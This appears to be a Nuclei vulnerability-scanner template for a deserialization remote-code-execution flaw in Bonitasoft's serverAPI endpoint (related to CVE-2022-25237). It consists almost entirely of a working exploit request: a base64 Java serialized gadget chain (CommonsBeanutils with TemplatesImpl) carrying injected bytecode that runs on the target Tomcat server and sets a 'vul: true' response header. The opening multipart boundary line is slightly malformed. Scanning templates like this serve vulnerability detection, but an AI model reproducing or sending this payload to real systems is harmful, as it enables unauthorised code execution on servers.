id: bonitasoft-serverAPI-rce

info:
  name: Bonitasoft serverAPI RCE
  author: h1ei1
  severity: critical
  description: The Bonitasoft deserialization vulnerability was discovered during the reproduction of CVE-2022-25237.
  reference:
    - http://mp.weixin.qq.com/s?__biz=Mzg3MTU0MjkwNw==&mid=2247490269&idx=1&sn=78357c8687101d66f11b98e91afac184&chksm=cefda3c9f98a2adfee40ec062470bacd46d6b42ea2069d62f93a3022eb197713668d2580e1bb&mpshare=1&scene=23&srcid=0530bEaTknyeozALkFfAbvgH&sharer_sharetime=1653965254260&sharer_shareid=4ab8b98c0a9c5866b3e90483ff7445f3#rd
  tags: rce,Bonitasoft,bonita

requests:
  - raw:
      - |
        POST /bonita/serverAPI/ HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
        Content-Type: multipart/form-data; boundary=f5631404ff081116b8ff496099469e76
        echo: 1

        5631404ff081116b8ff496099469e76
        Content-Disposition: form-data; name="binaryParameter"; filename="test"
        Content-Type: application/octet-stream
        
        base64_decode("rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3LjoYjqcyKkSAIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgAqamF2YS5sYW5nLlN0cmluZyRDYXNlSW5zZW5zaXRpdmVDb21wYXJhdG9ydwNcfVxQ5c4CAAB4cHQAEG91dHB1dFByb3BlcnRpZXN3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1lcQB+AARMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAABdXIAAltCrPMX+AYIVOACAAB4cAAAEK7K/rq+AAAAMQDCCgAvAGYKAGcAaAoAZwBpCABqCgBrAGwIAEkKAGsAbQoAbgBvCgBuAHAIAHEIAEoHAHIHAHMIAHQKAA0AdQoADAB2CwB3AHgLAHkAegsAeQB7BwB8CAB9CAB+CgANAH8IAIAIAIEIAEIIAIIIAEMHAIMIAIQIAIUKAB0AhgoAHQCHBwCICACJCgAiAIoIAIsKAIwAjQoAIgCOCACPCACQCgCRAJIHAJMKACsAlAcAlQcAlgcAlwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAdyZXF1ZXN0AQAbTG9yZy9hcGFjaGUvY295b3RlL1JlcXVlc3Q7AQAGaGVhZGVyAQASTGphdmEvbGFuZy9TdHJpbmc7AQABaQEAAUkBAAtuYW1lZE9iamVjdAEAJUxjb20vc3VuL2pteC9tYmVhbnNlcnZlci9OYW1lZE9iamVjdDsBAARmbGFnAQAdTGphdmF4L21hbmFnZW1lbnQvT2JqZWN0TmFtZTsBAA1jYW5vbmljYWxOYW1lAQADb2JqAQASTGphdmEvbGFuZy9PYmplY3Q7AQAIcmVzb3VyY2UBAApwcm9jZXNzb3JzAQAVTGphdmEvdXRpbC9BcnJheUxpc3Q7AQALbUJlYW5TZXJ2ZXIBAB5MamF2YXgvbWFuYWdlbWVudC9NQmVhblNlcnZlcjsBAAVmaWVsZAEAGUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBAA5tYnNJbnRlcmNlcHRvcgEACnJlcG9zaXRvcnkBACRMY29tL3N1bi9qbXgvbWJlYW5zZXJ2ZXIvUmVwb3NpdG9yeTsBAANzZXQBAA9MamF2YS91dGlsL1NldDsBAAJpdAEAFExqYXZhL3V0aWwvSXRlcmF0b3I7AQAJdGhyb3dhYmxlAQAVTGphdmEvbGFuZy9UaHJvd2FibGU7AQAEdGhpcwEAC0x0bXBIZWFkZXI7AQAWTG9jYWxWYXJpYWJsZVR5cGVUYWJsZQEANkxqYXZhL3V0aWwvU2V0PExjb20vc3VuL2pteC9tYmVhbnNlcnZlci9OYW1lZE9iamVjdDs+OwEAO0xqYXZhL3V0aWwvSXRlcmF0b3I8TGNvbS9zdW4vam14L21iZWFuc2VydmVyL05hbWVkT2JqZWN0Oz47AQAKRXhjZXB0aW9ucwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHAJgBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAA50bXBIZWFkZXIuamF2YQwAMAAxBwCZDACaAJsMAJwAnQEAJmNvbS5zdW4uam14Lm1iZWFuc2VydmVyLkpteE1CZWFuU2VydmVyBwCeDACfAKAMAKEAogcAowwApAClDACmAKcBADVjb20uc3VuLmpteC5pbnRlcmNlcHRvci5EZWZhdWx0TUJlYW5TZXJ2ZXJJbnRlcmNlcHRvcgEAImNvbS9zdW4vam14L21iZWFuc2VydmVyL1JlcG9zaXRvcnkBABtqYXZheC9tYW5hZ2VtZW50L09iamVjdE5hbWUBACoqOnR5cGU9R2xvYmFsUmVxdWVzdFByb2Nlc3NvcixuYW1lPSJodHRwKiIMADAAqAwAqQCqBwCrDABgAKwHAK0MAK4ArwwAsACxAQAjY29tL3N1bi9qbXgvbWJlYW5zZXJ2ZXIvTmFtZWRPYmplY3QBACNjb20uc3VuLmpteC5tYmVhbnNlcnZlci5OYW1lZE9iamVjdAEABG5hbWUMALIAswEABm9iamVjdAEALW9yZy5hcGFjaGUudG9tY2F0LnV0aWwubW9kZWxlci5CYXNlTW9kZWxNQmVhbgEAIm9yZy5hcGFjaGUuY295b3RlLlJlcXVlc3RHcm91cEluZm8BABNqYXZhL3V0aWwvQXJyYXlMaXN0AQAdb3JnLmFwYWNoZS5jb3lvdGUuUmVxdWVzdEluZm8BAANyZXEMALQAtQwApgC2AQAZb3JnL2FwYWNoZS9jb3lvdGUvUmVxdWVzdAEABGVjaG8MALcAuAEAAAcAuQwAugC7DAC8AL0BAAN2dWwBAAR0cnVlBwC+DAC/AMABABNqYXZhL2xhbmcvVGhyb3dhYmxlDADBADEBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAJdG1wSGVhZGVyAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAJ29yZy9hcGFjaGUvdG9tY2F0L3V0aWwvbW9kZWxlci9SZWdpc3RyeQEAC2dldFJlZ2lzdHJ5AQBPKExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvT2JqZWN0OylMb3JnL2FwYWNoZS90b21jYXQvdXRpbC9tb2RlbGVyL1JlZ2lzdHJ5OwEADmdldE1CZWFuU2VydmVyAQAgKClMamF2YXgvbWFuYWdlbWVudC9NQmVhblNlcnZlcjsBAA9qYXZhL2xhbmcvQ2xhc3MBAAdmb3JOYW1lAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAEADXNldEFjY2Vzc2libGUBAAQoWilWAQADZ2V0AQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAAVxdWVyeQEASShMamF2YXgvbWFuYWdlbWVudC9PYmplY3ROYW1lO0xqYXZheC9tYW5hZ2VtZW50L1F1ZXJ5RXhwOylMamF2YS91dGlsL1NldDsBAA1qYXZhL3V0aWwvU2V0AQAWKClMamF2YS91dGlsL0l0ZXJhdG9yOwEAEmphdmEvdXRpbC9JdGVyYXRvcgEAB2hhc05leHQBAAMoKVoBAARuZXh0AQAUKClMamF2YS9sYW5nL09iamVjdDsBABBnZXRDYW5vbmljYWxOYW1lAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAARzaXplAQADKClJAQAVKEkpTGphdmEvbGFuZy9PYmplY3Q7AQAJZ2V0SGVhZGVyAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBABBqYXZhL2xhbmcvU3RyaW5nAQAGZXF1YWxzAQAVKExqYXZhL2xhbmcvT2JqZWN0OylaAQALZ2V0UmVzcG9uc2UBAB4oKUxvcmcvYXBhY2hlL2NveW90ZS9SZXNwb25zZTsBABpvcmcvYXBhY2hlL2NveW90ZS9SZXNwb25zZQEACXNldEhlYWRlcgEAJyhMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZzspVgEAD3ByaW50U3RhY2tUcmFjZQAhAC4ALwAAAAAAAwABADAAMQACADIAAALTAAQAEAAAAUEqtwABAQG4AAK2AANMEgS4AAUSBrYAB00sBLYACCwrtgAJThIKuAAFEgu2AAdNLAS2AAgsLbYACcAADDoEGQS7AA1ZEg63AA8BtgAQOgUZBbkAEQEAOgYZBrkAEgEAmQDWGQa5ABMBAMAAFDoHEhW4AAUSFrYAB00sBLYACCwZB7YACcAADToIGQi2ABc6CRIVuAAFEhi2AAdNLAS2AAgsGQe2AAk6ChIZuAAFEhq2AAdNLAS2AAgsGQq2AAk6CxIbuAAFEhy2AAdNLAS2AAgsGQu2AAnAAB06DBIeuAAFEh+2AAdNLAS2AAgDNg0VDRkMtgAgogA9LBkMFQ22ACG2AAnAACI6DhkOEiO2ACQ6DxkPxgAZGQ8SJbYAJpoADxkOtgAnEigSKbYAKoQNAaf/v6f/JqcACEwrtgAspwAETLEAAgAEATQBNwArAAQBPAE/AC0AAwAzAAAAogAoAAAAFgAEABkADQAaABgAGwAdABwAIwAeAC4AHwAzACAAPQAhAE4AIwBXACQAYQAlAG0AJgB4ACcAfQAoAIgAKQCPACsAmgAsAJ8ALQCnAC8AsgAwALcAMQC/ADMAygA0AM8ANQDaADcA5QA4AOoAOQD3ADoBBwA7ARAAPAEfAD0BKwA5ATEAQAE0AEQBNwBCATgAQwE8AEcBPwBFAUAASAA0AAAArAARAQcAJAA1ADYADgEQABsANwA4AA8A7QBEADkAOgANAG0AxAA7ADwABwCIAKkAPQA+AAgAjwCiAD8AOAAJAKcAigBAAEEACgC/AHIAQgBBAAsA2gBXAEMARAAMAA0BJwBFAEYAAQAYARwARwBIAAIAIwERAEkAQQADAD0A9wBKAEsABABOAOYATABNAAUAVwDdAE4ATwAGATgABABQAFEAAQAAAUEAUgBTAAAAVAAAABYAAgBOAOYATABVAAUAVwDdAE4AVgAGAFcAAAAEAAEALQABAFgAWQACADIAAAA/AAAAAwAAAAGxAAAAAgAzAAAABgABAAAASgA0AAAAIAADAAAAAQBSAFMAAAAAAAEAWgBbAAEAAAABAFwAXQACAFcAAAAEAAEAXgABAFgAXwACADIAAABJAAAABAAAAAGxAAAAAgAzAAAABgABAAAATQA0AAAAKgAEAAAAAQBSAFMAAAAAAAEAWgBbAAEAAAABAGAAYQACAAAAAQBiAGMAAwBXAAAABAABAF4AAQBkAAAAAgBlcHQABnRyMXBsZXB3AQB4cQB+AA14")
        --f5631404ff081116b8ff496099469e76
        Content-Disposition: form-data; name="parametersValues"; filename="test2"
        Content-Type: application/xml
        
        <object-stream>
        <object-array>
        <string>==ByteArray==</string>
        </object-array>
        </object-stream>
        --f5631404ff081116b8ff496099469e76--
       
    matchers:
      - type: word
        part: header
        words:
          - "vul: true"
